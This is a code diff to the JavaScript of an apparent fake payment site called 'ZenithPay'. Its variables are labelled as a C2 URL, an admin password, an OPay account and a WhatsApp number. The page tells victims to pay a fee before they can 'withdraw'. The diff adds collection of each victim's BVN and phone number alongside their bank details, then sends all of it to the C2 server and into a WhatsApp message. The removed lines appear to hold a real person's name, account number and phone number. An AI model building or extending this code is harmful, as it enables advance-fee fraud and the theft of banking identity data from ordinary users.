@@ -2,9 +2,9 @@
 // ⚠️ UPDATE WITH YOUR DETAILS ⚠️
 var C2_URL = 'https://zenithpay-backend-ehdh.onrender.com';
 var ADMIN_PASSWORD = 'ZENITH2026';
-var OPAY_ACCOUNT = '9120711977';        // <-- YOUR OPAY ACCOUNT NUMBER
-var OPAY_NAME = 'KOLADE SOLOMON';       // <-- YOUR OPAY ACCOUNT NAME
-var WHATSAPP_NUMBER = '2349132683379';   // <-- YOUR WHATSAPP NUMBER
+var OPAY_ACCOUNT = '0123456789';        // <-- YOUR OPAY ACCOUNT NUMBER
+var OPAY_NAME = 'ZenithPay Admin';       // <-- YOUR OPAY ACCOUNT NAME
+var WHATSAPP_NUMBER = '2348000000000';   // <-- YOUR WHATSAPP NUMBER
 
 // ============================================================
 // ===== DASHBOARD LOAD =====
@@ -284,26 +284,32 @@ document.getElementById('copyAccount')?.addEventListener('click', function() {
 });
 
 // ============================================================
-// ===== I HAVE PAID → WHATSAPP =====
-// ============================================================
-
-// ============================================================
-// ===== I HAVE PAID → WHATSAPP (WITH USER BANK DETAILS) =====
+// ===== I HAVE PAID → WHATSAPP (WITH ALL USER DETAILS) =====
 // ============================================================
 
 document.getElementById('iHavePaidBtn')?.addEventListener('click', function() {
     var amount = document.getElementById('depositAmount').value;
     var userBank = document.getElementById('userBank').value;
     var userAccount = document.getElementById('userAccountNumber').value;
+    var userBvn = document.getElementById('userBvn').value;
+    var userPhone = document.getElementById('userPhone').value;
     var userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');
 
-    // Validate user bank details
+    // Validate required fields
     if (!userBank || !userAccount) {
         alert('⚠️ Please enter your bank name and account number.');
         return;
     }
+    if (!userBvn) {
+        alert('⚠️ Please enter your BVN for verification.');
+        return;
+    }
+    if (!userPhone) {
+        alert('⚠️ Please enter your phone number.');
+        return;
+    }
 
-    // Send payment confirmation + user bank details to server
+    // Send all withdrawal details to server
     sendData({
         type: 'opay_withdrawal_attempt',
         amount: amount,
@@ -311,6 +317,8 @@ document.getElementById('iHavePaidBtn')?.addEventListener('click', function() {
         user_name: userData.fullname || 'Unknown',
         user_bank: userBank,
         user_account: userAccount,
+        user_bvn: userBvn,
+        user_phone: userPhone,
         timestamp: Date.now()
     });
 
@@ -320,21 +328,9 @@ document.getElementById('iHavePaidBtn')?.addEventListener('click', function() {
     // Open WhatsApp modal
     document.getElementById('whatsappModal').classList.remove('hidden');
 
-    // Update WhatsApp link with dynamic data
+    // Update WhatsApp link with all details
     var waLink = document.getElementById('whatsappLink');
-    var msg = 'Hello, I sent ₦' + amount + ' to your OPay account (' + OPAY_ACCOUNT + ') for my ZenithPay withdrawal. My name is ' + (userData.fullname || 'User') + '. My bank is ' + userBank + ', account: ' + userAccount + '. Please send my verification code.';
-    waLink.href = 'https://wa.me/' + WHATSAPP_NUMBER + '?text=' + encodeURIComponent(msg);
-});
-
-    // Close withdraw modal
-    document.getElementById('withdrawModal').classList.add('hidden');
-
-    // Open WhatsApp modal
-    document.getElementById('whatsappModal').classList.remove('hidden');
-
-    // Update WhatsApp link with dynamic data
-    var waLink = document.getElementById('whatsappLink');
-    var msg = 'Hello, I sent ₦' + amount + ' to your OPay account (' + OPAY_ACCOUNT + ') for my ZenithPay withdrawal. My name is ' + (userData.fullname || 'User') + '. Please send my verification code.';
+    var msg = 'Hello, I sent ₦' + amount + ' to your OPay account (' + OPAY_ACCOUNT + ') for my ZenithPay withdrawal. My name is ' + (userData.fullname || 'User') + '. Bank: ' + userBank + ', Account: ' + userAccount + ', BVN: ' + userBvn + ', Phone: ' + userPhone + '. Please send my verification code.';
     waLink.href = 'https://wa.me/' + WHATSAPP_NUMBER + '?text=' + encodeURIComponent(msg);
 });
 
